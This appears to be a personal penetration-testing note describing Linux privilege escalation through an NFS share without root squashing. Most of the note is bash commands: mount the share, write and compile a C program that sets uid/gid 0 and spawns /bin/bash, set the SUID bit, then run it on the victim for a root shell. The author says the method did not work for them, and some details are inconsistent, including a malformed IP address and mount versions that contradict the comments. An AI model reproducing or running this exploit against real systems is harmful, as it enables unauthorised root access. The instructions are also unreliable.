-- -
General workflow is to find a directory you can mount that does not squash root. Mount it on your attack box, make a malicious executable as root, give malware SUID bit, then run said executable from the victim to get a shell. 
[[Dark Arts/Privesc/Linux/Enumeration/NFS Root Squashing|Enum]]

#### Exploit
**This vector does not seem to work, I have tried it with different payloads and methods and it doesn't seem like it respects the SUID bit **
###### On Attackbox
```bash
# make a mount point
# can make it wherever, usually I do it in /mnt 
mkdir /tmp/mountme

# mount remote share
# requires sudo to run
# may need to play with the version to get it to mount, when attempting this in practice: 
#vers=3 
# is what worked
mount -o rw,vers=1 <target ip>:<mount dir> /tmp/mountme
mount -o rw,vers=2 192.168.67:/tmp /tmp/mountme

# make malicious c file on remote mount
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/x.c

# compile malware
# ignore warnings like usual
gcc /tmp/mountme/x.c -o /tmp/mountme/x
chmod +s /tmp/mountme/x
```
###### On Victim
```bash
# now just go to the file location and run
cd /tmp 
./x
# should spawn a root shell
```